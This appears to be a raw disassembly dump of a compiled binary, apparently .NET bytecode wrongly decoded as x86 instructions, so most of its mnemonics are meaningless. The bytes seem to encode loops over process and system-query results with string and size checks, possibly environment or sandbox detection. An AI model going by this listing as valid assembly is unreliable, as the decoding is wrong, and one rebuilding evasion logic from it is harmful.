  402b65:	17                   	pop    %ss
  402b66:	2a 28                	sub    (%eax),%ch
  402b68:	30 00                	xor    %al,(%eax)
  402b6a:	00 06                	add    %al,(%esi)
  402b6c:	2c 02                	sub    $0x2,%al
  402b6e:	17                   	pop    %ss
  402b6f:	2a 28                	sub    (%eax),%ch
  402b71:	31 00                	xor    %eax,(%eax)
  402b73:	00 06                	add    %al,(%esi)
  402b75:	2c 02                	sub    $0x2,%al
  402b77:	17                   	pop    %ss
  402b78:	2a 16                	sub    (%esi),%dl
  402b7a:	2a 3e                	sub    (%esi),%bh
  402b7c:	28 73 00             	sub    %dh,0x0(%ebx)
  402b7f:	00 0a                	add    %cl,(%edx)
  402b81:	2d 06 28 74 00       	sub    $0x742806,%eax
  402b86:	00 0a                	add    %cl,(%edx)
  402b88:	2a 17                	sub    (%edi),%dl
  402b8a:	2a 00                	sub    (%eax),%al
  402b8c:	1b 30                	sbb    (%eax),%esi
  402b8e:	03 00                	add    (%eax),%eax
  402b90:	56                   	push   %esi
  402b91:	00 00                	add    %al,(%eax)
  402b93:	00 0d 00 00 11 28    	add    %cl,0x28110000
  402b99:	75 00                	jne    0x402b9b
  402b9b:	00 0a                	add    %cl,(%edx)
  402b9d:	0a 16                	or     (%esi),%dl
  402b9f:	0b 2b                	or     (%ebx),%ebp
  402ba1:	3c 06                	cmp    $0x6,%al
  402ba3:	07                   	pop    %es
  402ba4:	9a 0c 73 62 00 00 06 	lcall  $0x600,$0x62730c
  402bab:	0d 09 08 6f 76       	or     $0x766f0809,%eax
  402bb0:	00 00                	add    %al,(%eax)
  402bb2:	0a 6f 77             	or     0x77(%edi),%ch
  402bb5:	00 00                	add    %al,(%eax)
  402bb7:	0a 7d 29             	or     0x29(%ebp),%bh
  402bba:	00 00                	add    %al,(%eax)
  402bbc:	04 7e                	add    $0x7e,%al
  402bbe:	09 00                	or     %eax,(%eax)
  402bc0:	00 04 09             	add    %al,(%ecx,%ecx,1)
  402bc3:	fe 06                	incb   (%esi)
  402bc5:	63 00                	arpl   %eax,(%eax)
  402bc7:	00 06                	add    %al,(%esi)
  402bc9:	73 78                	jae    0x402c43
  402bcb:	00 00                	add    %al,(%eax)
  402bcd:	0a 28                	or     (%eax),%ch
  402bcf:	01 00                	add    %eax,(%eax)
  402bd1:	00 2b                	add    %ch,(%ebx)
  402bd3:	2c 05                	sub    $0x5,%al
  402bd5:	17                   	pop    %ss
  402bd6:	13 04 de             	adc    (%esi,%ebx,8),%eax
  402bd9:	11 07                	adc    %eax,(%edi)
  402bdb:	17                   	pop    %ss
  402bdc:	58                   	pop    %eax
  402bdd:	0b 07                	or     (%edi),%eax
  402bdf:	06                   	push   %es
  402be0:	8e 69 32             	mov    0x32(%ecx),%gs
  402be3:	be de 03 26 de       	mov    $0xde2603de,%esi
  402be8:	00 16                	add    %dl,(%esi)
  402bea:	2a 11                	sub    (%ecx),%dl
  402bec:	04 2a                	add    $0x2a,%al
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	01 10                	add    %edx,(%eax)
  402bf2:	00 00                	add    %al,(%eax)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	00 00                	add    %al,(%eax)
  402bf8:	4e                   	dec    %esi
  402bf9:	4e                   	dec    %esi
  402bfa:	00 03                	add    %al,(%ebx)
  402bfc:	13 00                	adc    (%eax),%eax
  402bfe:	00 01                	add    %al,(%ecx)
  402c00:	1b 30                	sbb    (%eax),%esi
  402c02:	03 00                	add    (%eax),%eax
  402c04:	56                   	push   %esi
  402c05:	00 00                	add    %al,(%eax)
  402c07:	00 0e                	add    %cl,(%esi)
  402c09:	00 00                	add    %al,(%eax)
  402c0b:	11 28                	adc    %ebp,(%eax)
  402c0d:	75 00                	jne    0x402c0f
  402c0f:	00 0a                	add    %cl,(%edx)
  402c11:	0a 16                	or     (%esi),%dl
  402c13:	0b 2b                	or     (%ebx),%ebp
  402c15:	3c 06                	cmp    $0x6,%al
  402c17:	07                   	pop    %es
  402c18:	9a 0c 73 64 00 00 06 	lcall  $0x600,$0x64730c
  402c1f:	0d 09 08 6f 76       	or     $0x766f0809,%eax
  402c24:	00 00                	add    %al,(%eax)
  402c26:	0a 6f 77             	or     0x77(%edi),%ch
  402c29:	00 00                	add    %al,(%eax)
  402c2b:	0a 7d 2a             	or     0x2a(%ebp),%bh
  402c2e:	00 00                	add    %al,(%eax)
  402c30:	04 7e                	add    $0x7e,%al
  402c32:	0a 00                	or     (%eax),%al
  402c34:	00 04 09             	add    %al,(%ecx,%ecx,1)
  402c37:	fe 06                	incb   (%esi)
  402c39:	65 00 00             	add    %al,%gs:(%eax)
  402c3c:	06                   	push   %es
  402c3d:	73 78                	jae    0x402cb7
  402c3f:	00 00                	add    %al,(%eax)
  402c41:	0a 28                	or     (%eax),%ch
  402c43:	01 00                	add    %eax,(%eax)
  402c45:	00 2b                	add    %ch,(%ebx)
  402c47:	2c 05                	sub    $0x5,%al
  402c49:	17                   	pop    %ss
  402c4a:	13 04 de             	adc    (%esi,%ebx,8),%eax
  402c4d:	11 07                	adc    %eax,(%edi)
  402c4f:	17                   	pop    %ss
  402c50:	58                   	pop    %eax
  402c51:	0b 07                	or     (%edi),%eax
  402c53:	06                   	push   %es
  402c54:	8e 69 32             	mov    0x32(%ecx),%gs
  402c57:	be de 03 26 de       	mov    $0xde2603de,%esi
  402c5c:	00 16                	add    %dl,(%esi)
  402c5e:	2a 11                	sub    (%ecx),%dl
  402c60:	04 2a                	add    $0x2a,%al
  402c62:	00 00                	add    %al,(%eax)
  402c64:	01 10                	add    %edx,(%eax)
  402c66:	00 00                	add    %al,(%eax)
  402c68:	00 00                	add    %al,(%eax)
  402c6a:	00 00                	add    %al,(%eax)
  402c6c:	4e                   	dec    %esi
  402c6d:	4e                   	dec    %esi
  402c6e:	00 03                	add    %al,(%ebx)
  402c70:	13 00                	adc    (%eax),%eax
  402c72:	00 01                	add    %al,(%ecx)
  402c74:	1b 30                	sbb    (%eax),%esi
  402c76:	03 00                	add    (%eax),%eax
  402c78:	d3 00                	roll   %cl,(%eax)
  402c7a:	00 00                	add    %al,(%eax)
  402c7c:	0f 00 00             	sldt   (%eax)
  402c7f:	11 72 31             	adc    %esi,0x31(%edx)
  402c82:	0b 00                	or     (%eax),%eax
  402c84:	70 73                	jo     0x402cf9
  402c86:	7a 00                	jp     0x402c88
  402c88:	00 0a                	add    %cl,(%edx)
  402c8a:	0a 06                	or     (%esi),%al
  402c8c:	6f                   	outsl  %ds:(%esi),(%dx)
  402c8d:	7b 00                	jnp    0x402c8f
  402c8f:	00 0a                	add    %cl,(%edx)
  402c91:	6f                   	outsl  %ds:(%esi),(%dx)
  402c92:	7c 00                	jl     0x402c94
  402c94:	00 0a                	add    %cl,(%edx)
  402c96:	0b 38                	or     (%eax),%edi
  402c98:	8a 00                	mov    (%eax),%al
  402c9a:	00 00                	add    %al,(%eax)
  402c9c:	07                   	pop    %es
  402c9d:	6f                   	outsl  %ds:(%esi),(%dx)
  402c9e:	7d 00                	jge    0x402ca0
  402ca0:	00 0a                	add    %cl,(%edx)
  402ca2:	0c 73                	or     $0x73,%al
  402ca4:	66 00 00             	data16 add %al,(%eax)
  402ca7:	06                   	push   %es
  402ca8:	0d 09 08 72 77       	or     $0x77720809,%eax
  402cad:	0b 00                	or     (%eax),%eax
  402caf:	70 6f                	jo     0x402d20
  402cb1:	7e 00                	jle    0x402cb3
  402cb3:	00 0a                	add    %cl,(%edx)
  402cb5:	25 2d 06 26 72       	and    $0x7226062d,%eax
  402cba:	a2 06 00 70 6f       	mov    %al,0x6f700006
  402cbf:	7f 00                	jg     0x402cc1
  402cc1:	00 0a                	add    %cl,(%edx)
  402cc3:	6f                   	outsl  %ds:(%esi),(%dx)
  402cc4:	77 00                	ja     0x402cc6
  402cc6:	00 0a                	add    %cl,(%edx)
  402cc8:	7d 2b                	jge    0x402cf5
  402cca:	00 00                	add    %al,(%eax)
  402ccc:	04 09                	add    $0x9,%al
  402cce:	08 72 91             	or     %dh,-0x6f(%edx)
  402cd1:	0b 00                	or     (%eax),%eax
  402cd3:	70 6f                	jo     0x402d44
  402cd5:	7e 00                	jle    0x402cd7
  402cd7:	00 0a                	add    %cl,(%edx)
  402cd9:	25 2d 06 26 72       	and    $0x7226062d,%eax
  402cde:	a2 06 00 70 6f       	mov    %al,0x6f700006
  402ce3:	7f 00                	jg     0x402ce5
  402ce5:	00 0a                	add    %cl,(%edx)
  402ce7:	6f                   	outsl  %ds:(%esi),(%dx)
  402ce8:	77 00                	ja     0x402cea
  402cea:	00 0a                	add    %cl,(%edx)
  402cec:	7d 2c                	jge    0x402d1a
  402cee:	00 00                	add    %al,(%eax)
  402cf0:	04 7e                	add    $0x7e,%al
  402cf2:	0b 00                	or     (%eax),%eax
  402cf4:	00 04 09             	add    %al,(%ecx,%ecx,1)
  402cf7:	fe 06                	incb   (%esi)
  402cf9:	67 00 00             	add    %al,(%bx,%si)
  402cfc:	06                   	push   %es
  402cfd:	73 78                	jae    0x402d77
  402cff:	00 00                	add    %al,(%eax)
  402d01:	0a 28                	or     (%eax),%ch
  402d03:	01 00                	add    %eax,(%eax)
  402d05:	00 2b                	add    %ch,(%ebx)
  402d07:	2d 18 7e 0c 00       	sub    $0xc7e18,%eax
  402d0c:	00 04 09             	add    %al,(%ecx,%ecx,1)
  402d0f:	fe 06                	incb   (%esi)
  402d11:	68 00 00 06 73       	push   $0x73060000
  402d16:	78 00                	js     0x402d18
  402d18:	00 0a                	add    %cl,(%edx)
  402d1a:	28 01                	sub    %al,(%ecx)
  402d1c:	00 00                	add    %al,(%eax)
  402d1e:	2b 2c 05 17 13 04 de 	sub    -0x21fbece9(,%eax,1),%ebp
  402d25:	2a 07                	sub    (%edi),%al
  402d27:	6f                   	outsl  %ds:(%esi),(%dx)
  402d28:	80 00 00             	addb   $0x0,(%eax)
  402d2b:	0a 3a                	or     (%edx),%bh
  402d2d:	6b ff ff             	imul   $0xffffffff,%edi,%edi
  402d30:	ff                   	lcall  (bad)
  402d31:	de 0a                	fimuls (%edx)
  402d33:	07                   	pop    %es
  402d34:	2c 06                	sub    $0x6,%al
  402d36:	07                   	pop    %es
  402d37:	6f                   	outsl  %ds:(%esi),(%dx)
  402d38:	70 00                	jo     0x402d3a
  402d3a:	00 0a                	add    %cl,(%edx)
  402d3c:	dc de                	(bad)
  402d3e:	0a 06                	or     (%esi),%al
  402d40:	2c 06                	sub    $0x6,%al
  402d42:	06                   	push   %es
  402d43:	6f                   	outsl  %ds:(%esi),(%dx)
  402d44:	70 00                	jo     0x402d46
  402d46:	00 0a                	add    %cl,(%edx)
  402d48:	dc de                	(bad)
  402d4a:	03 26                	add    (%esi),%esp
  402d4c:	de 00                	fiadds (%eax)
  402d4e:	16                   	push   %ss
  402d4f:	2a 11                	sub    (%ecx),%dl
  402d51:	04 2a                	add    $0x2a,%al
  402d53:	00 01                	add    %al,(%ecx)
  402d55:	28 00                	sub    %al,(%eax)
  402d57:	00 02                	add    %al,(%edx)
  402d59:	00 17                	add    %dl,(%edi)
  402d5b:	00 9c b3 00 0a 00 00 	add    %bl,0xa00(%ebx,%esi,4)
  402d62:	00 00                	add    %al,(%eax)
  402d64:	02 00                	add    (%eax),%al
  402d66:	0b 00                	or     (%eax),%eax
  402d68:	b4 bf                	mov    $0xbf,%ah
  402d6a:	00 0a                	add    %cl,(%edx)
	...
  402d74:	cb                   	lret
  402d75:	cb                   	lret
  402d76:	00 03                	add    %al,(%ebx)
  402d78:	13 00                	adc    (%eax),%eax
  402d7a:	00 01                	add    %al,(%ecx)
  402d7c:	1b 30                	sbb    (%eax),%esi
  402d7e:	02 00                	add    (%eax),%al
  402d80:	43                   	inc    %ebx
  402d81:	00 00                	add    %al,(%eax)
  402d83:	00 10                	add    %dl,(%eax)
  402d85:	00 00                	add    %al,(%eax)
  402d87:	11 7e 17             	adc    %edi,0x17(%esi)
  402d8a:	00 00                	add    %al,(%eax)
  402d8c:	0a 72 9d             	or     -0x63(%edx),%dh
  402d8f:	0b 00                	or     (%eax),%eax
  402d91:	70 6f                	jo     0x402e02
  402d93:	81 00 00 0a 0a 06    	addl   $0x60a0a00,(%eax)
  402d99:	2c 1b                	sub    $0x1b,%al
  402d9b:	06                   	push   %es
  402d9c:	72 26                	jb     0x402dc4
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	70 6f                	jo     0x402e11
  402da2:	82 00 00             	addb   $0x0,(%eax)
  402da5:	0a 0b                	or     (%ebx),%cl
  402da7:	07                   	pop    %es
  402da8:	2c 0c                	sub    $0xc,%al
  402daa:	07                   	pop    %es
  402dab:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402dac:	47                   	inc    %edi
  402dad:	00 00                	add    %al,(%eax)
  402daf:	01 2c 04             	add    %ebp,(%esp,%eax,1)
  402db2:	17                   	pop    %ss
  402db3:	0c de                	or     $0xde,%al
  402db5:	13 de                	adc    %esi,%ebx
  402db7:	0a 06                	or     (%esi),%al
  402db9:	2c 06                	sub    $0x6,%al
  402dbb:	06                   	push   %es
  402dbc:	6f                   	outsl  %ds:(%esi),(%dx)
  402dbd:	70 00                	jo     0x402dbf
  402dbf:	00 0a                	add    %cl,(%edx)
  402dc1:	dc de                	(bad)
  402dc3:	03 26                	add    (%esi),%esp
  402dc5:	de 00                	fiadds (%eax)
  402dc7:	16                   	push   %ss
  402dc8:	2a 08                	sub    (%eax),%cl
  402dca:	2a 00                	sub    (%eax),%al
  402dcc:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402dcf:	00 02                	add    %al,(%edx)
  402dd1:	00 10                	add    %dl,(%eax)
  402dd3:	00 20                	add    %ah,(%eax)
  402dd5:	30 00                	xor    %al,(%eax)
  402dd7:	0a 00                	or     (%eax),%al
  402dd9:	00 00                	add    %al,(%eax)
  402ddb:	00 00                	add    %al,(%eax)
  402ddd:	00 00                	add    %al,(%eax)
  402ddf:	00 3c 3c             	add    %bh,(%esp,%edi,1)
  402de2:	00 03                	add    %al,(%ebx)
  402de4:	13 00                	adc    (%eax),%eax
  402de6:	00 01                	add    %al,(%ecx)
  402de8:	1b 30                	sbb    (%eax),%esi
  402dea:	02 00                	add    (%eax),%al
  402dec:	2c 00                	sub    $0x0,%al
  402dee:	00 00                	add    %al,(%eax)
  402df0:	09 00                	or     %eax,(%eax)
  402df2:	00 11                	add    %dl,(%ecx)
  402df4:	28 83 00 00 0a 1f    	sub    %al,0x1f0a0000(%ebx)
  402dfa:	64 28 3a             	sub    %bh,%fs:(%edx)
  402dfd:	00 00                	add    %al,(%eax)
  402dff:	0a 25 6f 84 00 00    	or     0x846f,%ah
  402e05:	0a 6f 85             	or     -0x7b(%edi),%ch
  402e08:	00 00                	add    %al,(%eax)
  402e0a:	0a 20                	or     (%eax),%ah
  402e0c:	96                   	xchg   %eax,%esi
  402e0d:	00 00                	add    %al,(%eax)
  402e0f:	00 6a 31             	add    %ch,0x31(%edx)
  402e12:	04 17                	add    $0x17,%al
  402e14:	0a de                	or     %dh,%bl
  402e16:	07                   	pop    %es
  402e17:	de 03                	fiadds (%ebx)
  402e19:	26 de 00             	fiadds %es:(%eax)
  402e1c:	16                   	push   %ss
  402e1d:	2a 06                	sub    (%esi),%al
  402e1f:	2a 01                	sub    (%ecx),%al
  402e21:	10 00                	adc    %al,(%eax)
  402e23:	00 00                	add    %al,(%eax)
  402e25:	00 00                	add    %al,(%eax)
  402e27:	00 25 25 00 03 13    	add    %ah,0x13030025
  402e2d:	00 00                	add    %al,(%eax)
  402e2f:	01 1b                	add    %ebx,(%ebx)
  402e31:	30 05 00 9a 00 00    	xor    %al,0x9a00
  402e37:	00 11                	add    %dl,(%ecx)
  402e39:	00 00                	add    %al,(%eax)
  402e3b:	11 28                	adc    %ebp,(%eax)
  402e3d:	86 00                	xchg   %al,(%eax)
  402e3f:	00 0a                	add    %cl,(%edx)
  402e41:	0a 16                	or     (%esi),%dl
  402e43:	0b 2b                	or     (%ebx),%ebp
  402e45:	7d 06                	jge    0x402e4d
  402e47:	07                   	pop    %es
  402e48:	9a 0c 73 5f 00 00 06 	lcall  $0x600,$0x5f730c
  402e4f:	0d 09 08 6f 87       	or     $0x876f0809,%eax
  402e54:	00 00                	add    %al,(%eax)
  402e56:	0a 6f 7f             	or     0x7f(%edi),%ch
  402e59:	00 00                	add    %al,(%eax)
  402e5b:	0a 7d 27             	or     0x27(%ebp),%bh
  402e5e:	00 00                	add    %al,(%eax)
  402e60:	04 09                	add    $0x9,%al
  402e62:	7b 27                	jnp    0x402e8b
  402e64:	00 00                	add    %al,(%eax)
  402e66:	04 28                	add    $0x28,%al
  402e68:	5f                   	pop    %edi
  402e69:	00 00                	add    %al,(%eax)
  402e6b:	0a 2d 51 09 72 36    	or     0x36720951,%ch
  402e71:	0c 00                	or     $0x0,%al
  402e73:	70 16                	jo     0x402e8b
  402e75:	09 7b 27             	or     %edi,0x27(%ebx)
  402e78:	00 00                	add    %al,(%eax)
  402e7a:	04 6f                	add    $0x6f,%al
  402e7c:	41                   	inc    %ecx
  402e7d:	00 00                	add    %al,(%eax)
  402e7f:	0a 18                	or     (%eax),%bl
  402e81:	5b                   	pop    %ebx
  402e82:	28 88 00 00 0a 09    	sub    %cl,0x90a0000(%eax)
  402e88:	fe 06                	incb   (%esi)
  402e8a:	60                   	pusha
  402e8b:	00 00                	add    %al,(%eax)
  402e8d:	06                   	push   %es
  402e8e:	73 89                	jae    0x402e19
  402e90:	00 00                	add    %al,(%eax)
  402e92:	0a 28                	or     (%eax),%ch
  402e94:	02 00                	add    (%eax),%al
  402e96:	00 2b                	add    %ch,(%ebx)
  402e98:	28 8b 00 00 0a 7d    	sub    %cl,0x7d0a0000(%ebx)
  402e9e:	28 00                	sub    %al,(%eax)
  402ea0:	00 04 7e             	add    %al,(%esi,%edi,2)
  402ea3:	0d 00 00 04 09       	or     $0x9040000,%eax
  402ea8:	fe 06                	incb   (%esi)
  402eaa:	61                   	popa
  402eab:	00 00                	add    %al,(%eax)
  402ead:	06                   	push   %es
  402eae:	73 78                	jae    0x402f28
  402eb0:	00 00                	add    %al,(%eax)
  402eb2:	0a 28                	or     (%eax),%ch
  402eb4:	01 00                	add    %eax,(%eax)
  402eb6:	00 2b                	add    %ch,(%ebx)
  402eb8:	2c 05                	sub    $0x5,%al
  402eba:	17                   	pop    %ss
  402ebb:	13 04 de             	adc    (%esi,%ebx,8),%eax
  402ebe:	14 07                	adc    $0x7,%al
  402ec0:	17                   	pop    %ss
  402ec1:	58                   	pop    %eax
  402ec2:	0b 07                	or     (%edi),%eax
  402ec4:	06                   	push   %es
  402ec5:	8e 69 3f             	mov    0x3f(%ecx),%gs
  402ec8:	7a ff                	jp     0x402ec9
  402eca:	ff                   	(bad)
  402ecb:	ff                   	lcall  (bad)
  402ecc:	de 03                	fiadds (%ebx)
  402ece:	26 de 00             	fiadds %es:(%eax)
  402ed1:	16                   	push   %ss
  402ed2:	2a 11                	sub    (%ecx),%dl
  402ed4:	04 2a                	add    $0x2a,%al
  402ed6:	00 00                	add    %al,(%eax)
  402ed8:	01 10                	add    %edx,(%eax)
  402eda:	00 00                	add    %al,(%eax)
  402edc:	00 00                	add    %al,(%eax)
  402ede:	00 00                	add    %al,(%eax)
  402ee0:	92                   	xchg   %eax,%edx
  402ee1:	92                   	xchg   %eax,%edx
  402ee2:	00 03                	add    %al,(%ebx)
  402ee4:	13 00                	adc    (%eax),%eax
  402ee6:	00 01                	add    %al,(%ecx)
  402ee8:	1b 30                	sbb    (%eax),%esi
  402eea:	03 00                	add    (%eax),%eax
  402eec:	13 01                	adc    (%ecx),%eax
  402eee:	00 00                	add    %al,(%eax)
  402ef0:	12 00                	adc    (%eax),%al
  402ef2:	00 11                	add    %dl,(%ecx)
  402ef4:	72 3a                	jb     0x402f30
  402ef6:	0c 00                	or     $0x0,%al
  402ef8:	70 73                	jo     0x402f6d
  402efa:	7a 00                	jp     0x402efc
  402efc:	00 0a                	add    %cl,(%edx)
  402efe:	0a 06                	or     (%esi),%al
  402f00:	6f                   	outsl  %ds:(%esi),(%dx)
  402f01:	7b 00                	jnp    0x402f03
  402f03:	00 0a                	add    %cl,(%edx)
  402f05:	6f                   	outsl  %ds:(%esi),(%dx)
  402f06:	7c 00                	jl     0x402f08
  402f08:	00 0a                	add    %cl,(%edx)
  402f0a:	0b 38                	or     (%eax),%edi
  402f0c:	ca 00 00             	lret   $0x0
  402f0f:	00 07                	add    %al,(%edi)
  402f11:	6f                   	outsl  %ds:(%esi),(%dx)
  402f12:	7d 00                	jge    0x402f14
  402f14:	00 0a                	add    %cl,(%edx)
  402f16:	25 72 95 08 00       	and    $0x89572,%eax
  402f1b:	70 6f                	jo     0x402f8c
  402f1d:	7e 00                	jle    0x402f1f
  402f1f:	00 0a                	add    %cl,(%edx)
  402f21:	25 2d 06 26 72       	and    $0x7226062d,%eax
  402f26:	a2 06 00 70 6f       	mov    %al,0x6f700006
  402f2b:	7f 00                	jg     0x402f2d
  402f2d:	00 0a                	add    %cl,(%edx)
  402f2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402f30:	77 00                	ja     0x402f32
  402f32:	00 0a                	add    %cl,(%edx)
  402f34:	0c 72                	or     $0x72,%al
  402f36:	76 0c                	jbe    0x402f44
  402f38:	00 70 6f             	add    %dh,0x6f(%eax)
  402f3b:	7e 00                	jle    0x402f3d
  402f3d:	00 0a                	add    %cl,(%edx)
  402f3f:	25 2d 06 26 72       	and    $0x7226062d,%eax
  402f44:	a2 06 00 70 6f       	mov    %al,0x6f700006
  402f49:	7f 00                	jg     0x402f4b
  402f4b:	00 0a                	add    %cl,(%edx)
  402f4d:	6f                   	outsl  %ds:(%esi),(%dx)
  402f4e:	77 00                	ja     0x402f50
  402f50:	00 0a                	add    %cl,(%edx)
  402f52:	0d 08 72 8e 0c       	or     $0xc8e7208,%eax
  402f57:	00 70 6f             	add    %dh,0x6f(%eax)
  402f5a:	8c 00                	mov    %es,(%eax)
  402f5c:	00 0a                	add    %cl,(%edx)
  402f5e:	2d 75 09 72 8e       	sub    $0x8e720975,%eax
  402f63:	0c 00                	or     $0x0,%al
  402f65:	70 6f                	jo     0x402fd6
  402f67:	8c 00                	mov    %es,(%eax)
  402f69:	00 0a                	add    %cl,(%edx)
  402f6b:	2d 68 08 72 9e       	sub    $0x9e720868,%eax
  402f70:	0c 00                	or     $0x0,%al
  402f72:	70 6f                	jo     0x402fe3
  402f74:	8c 00                	mov    %es,(%eax)
  402f76:	00 0a                	add    %cl,(%edx)
  402f78:	2d 5b 09 72 9e       	sub    $0x9e72095b,%eax
  402f7d:	0c 00                	or     $0x0,%al
  402f7f:	70 6f                	jo     0x402ff0
  402f81:	8c 00                	mov    %es,(%eax)
  402f83:	00 0a                	add    %cl,(%edx)
  402f85:	2d 4e 08 72 ac       	sub    $0xac72084e,%eax
  402f8a:	0c 00                	or     $0x0,%al
  402f8c:	70 6f                	jo     0x402ffd
  402f8e:	8c 00                	mov    %es,(%eax)
  402f90:	00 0a                	add    %cl,(%edx)
  402f92:	2d 41 09 72 ac       	sub    $0xac720941,%eax
  402f97:	0c 00                	or     $0x0,%al
  402f99:	70 6f                	jo     0x40300a
  402f9b:	8c 00                	mov    %es,(%eax)
  402f9d:	00 0a                	add    %cl,(%edx)
  402f9f:	2d 34 08 72 b6       	sub    $0xb6720834,%eax
  402fa4:	0c 00                	or     $0x0,%al
  402fa6:	70 6f                	jo     0x403017
  402fa8:	8c 00                	mov    %es,(%eax)
  402faa:	00 0a                	add    %cl,(%edx)
  402fac:	2d 27 09 72 b6       	sub    $0xb6720927,%eax
  402fb1:	0c 00                	or     $0x0,%al
  402fb3:	70 6f                	jo     0x403024
  402fb5:	8c 00                	mov    %es,(%eax)
  402fb7:	00 0a                	add    %cl,(%edx)
  402fb9:	2d 1a 08 72 c6       	sub    $0xc672081a,%eax
  402fbe:	0c 00                	or     $0x0,%al
  402fc0:	70 6f                	jo     0x403031
  402fc2:	8c 00                	mov    %es,(%eax)
  402fc4:	00 0a                	add    %cl,(%edx)
  402fc6:	2d 0d 09 72 c6       	sub    $0xc672090d,%eax
  402fcb:	0c 00                	or     $0x0,%al
  402fcd:	70 6f                	jo     0x40303e
  402fcf:	8c 00                	mov    %es,(%eax)
  402fd1:	00 0a                	add    %cl,(%edx)
  402fd3:	2c 05                	sub    $0x5,%al
  402fd5:	17                   	pop    %ss
  402fd6:	13 04 de             	adc    (%esi,%ebx,8),%eax
  402fd9:	2a 07                	sub    (%edi),%al
  402fdb:	6f                   	outsl  %ds:(%esi),(%dx)
  402fdc:	80 00 00             	addb   $0x0,(%eax)
  402fdf:	0a 3a                	or     (%edx),%bh
  402fe1:	2b ff                	sub    %edi,%edi
  402fe3:	ff                   	(bad)
  402fe4:	ff                   	lcall  (bad)
  402fe5:	de 0a                	fimuls (%edx)
  402fe7:	07                   	pop    %es
  402fe8:	2c 06                	sub    $0x6,%al
  402fea:	07                   	pop    %es
  402feb:	6f                   	outsl  %ds:(%esi),(%dx)
  402fec:	70 00                	jo     0x402fee
  402fee:	00 0a                	add    %cl,(%edx)
  402ff0:	dc de                	(bad)
  402ff2:	0a 06                	or     (%esi),%al
  402ff4:	2c 06                	sub    $0x6,%al
  402ff6:	06                   	push   %es
  402ff7:	6f                   	outsl  %ds:(%esi),(%dx)
  402ff8:	70 00                	jo     0x402ffa
  402ffa:	00 0a                	add    %cl,(%edx)
  402ffc:	dc de                	(bad)
  402ffe:	03 26                	add    (%esi),%esp
  403000:	de 00                	fiadds (%eax)
  403002:	16                   	push   %ss
  403003:	2a 11                	sub    (%ecx),%dl
  403005:	04 2a                	add    $0x2a,%al
  403007:	00 41 4c             	add    %al,0x4c(%ecx)
  40300a:	00 00                	add    %al,(%eax)
  40300c:	02 00                	add    (%eax),%al
  40300e:	00 00                	add    %al,(%eax)
  403010:	17                   	pop    %ss
  403011:	00 00                	add    %al,(%eax)
  403013:	00 dc                	add    %bl,%ah
  403015:	00 00                	add    %al,(%eax)
  403017:	00 f3                	add    %dh,%bl
  403019:	00 00                	add    %al,(%eax)
  40301b:	00 0a                	add    %cl,(%edx)
  40301d:	00 00                	add    %al,(%eax)
  40301f:	00 00                	add    %al,(%eax)
  403021:	00 00                	add    %al,(%eax)
  403023:	00 02                	add    %al,(%edx)
  403025:	00 00                	add    %al,(%eax)
  403027:	00 0b                	add    %cl,(%ebx)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 f4                	add    %dh,%ah
  40302d:	00 00                	add    %al,(%eax)
  40302f:	00 ff                	add    %bh,%bh
  403031:	00 00                	add    %al,(%eax)
  403033:	00 0a                	add    %cl,(%edx)
	...
  403041:	00 00                	add    %al,(%eax)
  403043:	00 0b                	add    %cl,(%ebx)
  403045:	01 00                	add    %eax,(%eax)
  403047:	00 0b                	add    %cl,(%ebx)
  403049:	01 00                	add    %eax,(%eax)
  40304b:	00 03                	add    %al,(%ebx)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	00 13                	add    %dl,(%ebx)
  403051:	00 00                	add    %al,(%eax)
  403053:	01 1b                	add    %ebx,(%ebx)
  403055:	30 02                	xor    %al,(%edx)
  403057:	00 bb 00 00 00 13    	add    %bh,0x13000000(%ebx)
  40305d:	00 00                	add    %al,(%eax)
  40305f:	11 72 d0             	adc    %esi,-0x30(%edx)
  403062:	0c 00                	or     $0x0,%al
  403064:	70 73                	jo     0x4030d9
  403066:	7a 00                	jp     0x403068
  403068:	00 0a                	add    %cl,(%edx)
  40306a:	0a 06                	or     (%esi),%al
  40306c:	6f                   	outsl  %ds:(%esi),(%dx)
  40306d:	7b 00                	jnp    0x40306f
  40306f:	00 0a                	add    %cl,(%edx)
  403071:	6f                   	outsl  %ds:(%esi),(%dx)
  403072:	7c 00                	jl     0x403074
  403074:	00 0a                	add    %cl,(%edx)
  403076:	0b 2b                	or     (%ebx),%ebp
  403078:	24 07                	and    $0x7,%al
  40307a:	6f                   	outsl  %ds:(%esi),(%dx)
  40307b:	7d 00                	jge    0x40307d
  40307d:	00 0a                	add    %cl,(%edx)
  40307f:	72 3a                	jb     0x4030bb
  403081:	0d 00 70 6f 7e       	or     $0x7e6f7000,%eax
  403086:	00 00                	add    %al,(%eax)
  403088:	0a 28                	or     (%eax),%ch
  40308a:	8d 00                	lea    (%eax),%eax
  40308c:	00 0a                	add    %cl,(%edx)
  40308e:	20 00                	and    %al,(%eax)
  403090:	00 00                	add    %al,(%eax)
  403092:	40                   	inc    %eax
  403093:	6a 5c                	push   $0x5c
  403095:	1a 6a 34             	sbb    0x34(%edx),%ch
  403098:	04 17                	add    $0x17,%al
  40309a:	0c de                	or     $0xde,%al
  40309c:	7c 07                	jl     0x4030a5
  40309e:	6f                   	outsl  %ds:(%esi),(%dx)
  40309f:	80 00 00             	addb   $0x0,(%eax)
  4030a2:	0a 2d d4 de 0a 07    	or     0x70aded4,%ch
  4030a8:	2c 06                	sub    $0x6,%al
  4030aa:	07                   	pop    %es
  4030ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4030ac:	70 00                	jo     0x4030ae
  4030ae:	00 0a                	add    %cl,(%edx)
  4030b0:	dc de                	(bad)
  4030b2:	0a 06                	or     (%esi),%al
  4030b4:	2c 06                	sub    $0x6,%al
  4030b6:	06                   	push   %es
  4030b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4030b8:	70 00                	jo     0x4030ba
  4030ba:	00 0a                	add    %cl,(%edx)
  4030bc:	dc 72 62             	fdivl  0x62(%edx)
  4030bf:	0d 00 70 73 7a       	or     $0x7a737000,%eax
  4030c4:	00 00                	add    %al,(%eax)
  4030c6:	0a 0d 09 6f 7b 00    	or     0x7b6f09,%cl
  4030cc:	00 0a                	add    %cl,(%edx)
